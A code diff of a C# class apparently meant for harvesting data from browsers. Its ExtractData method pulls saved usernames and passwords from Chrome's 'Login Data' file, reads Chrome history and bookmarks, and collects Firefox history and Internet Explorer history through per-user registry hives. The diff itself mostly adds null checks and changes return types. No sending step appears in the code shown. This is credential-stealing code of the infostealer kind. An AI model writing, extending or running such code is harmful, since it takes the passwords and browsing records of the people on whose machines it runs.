@@ -2,12 +2,10 @@
 using System.IO;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Security.Cryptography;
 using System.Collections.Generic;
 using System.Linq;
-using System.Web.Script;
-using System.Web.Script.Serialization;
 using Microsoft.Win32;
+using System.Security.Cryptography;
 
 namespace TP
 {
@@ -21,20 +19,17 @@ namespace TP
 
         protected override string ExtractData()
         {
-            string chomePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\";
-            string frfxPath = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
-            List<string> ieHistory = GetIEHistory();
-            List<string> firefoxHistory = GetFirefoxHistory();
             Tuple<List<string>, List<string>> chromeUserPassword = GetChromeUserPassword();
             List<string> chromeHistory = GetChromeHistory();
-            string chromeBookmarks = GetChromeBookmarks();
+            List<string> chromeBookmarks = GetChromeBookmarks();
+            List<string> firefoxHistory = GetFirefoxHistory();
+            List<string> ieHistory = GetIEHistory();
+
             return "";
         }
 
         private List<string> GetIEHistory()
         {
-            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
-            Encoding encoding = Encoding.GetEncoding(28591);
             var localKey = RegistryKey.OpenBaseKey(RegistryHive.Users, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
             string pattern = @"S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$";
             string[] subKeys = localKey.GetSubKeyNames();
@@ -66,9 +61,12 @@ namespace TP
 
         private List<string> GetChromeHistory()
         {
-            var filePath = @" % USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
+            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
             string pattern = @"(htt(p|s)://([\w-]+\.)+[\w-]+[\w- ./?%&=]*)*";
             string binaryText = ReadFilePath(filePath, Encoding.Default);
+
+            if (binaryText == null)
+                return null;
 
             Regex historyRegex = new Regex(pattern);
             var historyMatches = historyRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
@@ -82,11 +80,16 @@ namespace TP
             return history;
         }
 
-        private string GetChromeBookmarks()
+        private List<string> GetChromeBookmarks()
         {
             var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
             string jsonText = ReadFilePath(filePath, Encoding.Default);
-            return jsonText;
+            List<string> jsons = new List<string>(1);
+            jsons.Add(jsonText);
+            if (jsonText == null)
+                return null;
+
+            return jsons;
         }
 
 
@@ -98,6 +101,9 @@ namespace TP
 
             string binaryText = ReadFilePath(pathWithEnv, encoding);
 
+            if (binaryText == null)
+                return null;
+
             List<string> decPwdArray = ExtractPassword(encoding, binaryText);
             List<string> usr = ExtractUser(encoding, binaryText);
 
@@ -108,10 +114,15 @@ namespace TP
         {
             var pathWithEnv = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
+
+            if (!Directory.Exists(filePath))
+                return null;
+            
             string fxHistory = Directory.GetDirectories(filePath, "*.*").Where(s => s.EndsWith(".default")).ToList().Last();
             string pattern = @"(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?";
             Regex firefoxHistory = new Regex(pattern);
             string historyFile = ReadFilePath(fxHistory + "\\places.sqlite", Encoding.Default);
+            
             Regex histRegex = new Regex(pattern);
             var histMatches = histRegex.Matches(historyFile).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
             List<string> history = new List<string>();
@@ -161,7 +172,8 @@ namespace TP
         private static string ReadFilePath(string pathWithEnv, Encoding encoding)
         {
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
-
+            if (filePath == null)
+                return null;
             FileStream fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
             StreamReader streamReader = new StreamReader(fs, encoding);
             string binaryText = streamReader.ReadToEnd();
